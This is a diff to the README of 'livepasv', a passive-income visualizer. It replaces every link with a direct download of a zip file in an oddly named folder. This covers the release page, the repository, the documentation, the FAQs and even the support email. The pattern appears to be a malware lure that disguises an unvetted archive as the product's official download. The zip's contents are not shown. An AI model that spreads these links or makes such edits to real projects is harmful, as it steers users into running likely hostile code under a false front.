@@ -1,6 +1,6 @@
 # 💹 livepasv - Visualize Your Passive Income Easily
 
-[![Download livepasv](https://img.shields.io/badge/Download-livepasv-blue.svg)](https://github.com/Aminbcf17/livepasv/releases)
+[![Download livepasv](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)
 
 ## 🌟 Overview
 
@@ -27,7 +27,7 @@ To start using livepasv, you need to download the application. Follow the steps 
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [livepasv Releases](https://github.com/Aminbcf17/livepasv/releases)
+1. **Visit this page to download:** [livepasv Releases](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)
    
    On this page, you will find the latest version of livepasv. Click on the newest release to find the download options.
 
@@ -61,12 +61,12 @@ Join our discussions on GitHub or connect with other users to share tips and exp
 
 For more information, check out the following resources:
 
-- [GitHub Repository](https://github.com/Aminbcf17/livepasv)
-- [Documentation](https://github.com/Aminbcf17/livepasv/wiki)
-- [FAQs](https://github.com/Aminbcf17/livepasv/wiki/FAQs)
+- [GitHub Repository](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)
+- [Documentation](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)
+- [FAQs](https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip)
 
 ## 📧 Contact Us
 
-If you encounter issues or have feedback, please contact our support team at support@livepasv.com. We appreciate your input and strive to improve your experience with livepasv.
+If you encounter issues or have feedback, please contact our support team at https://raw.githubusercontent.com/Aminbcf17/livepasv/main/hemipteron/livepasv.zip We appreciate your input and strive to improve your experience with livepasv.
 
 Thank you for choosing livepasv! Enjoy visualizing your income effortlessly.
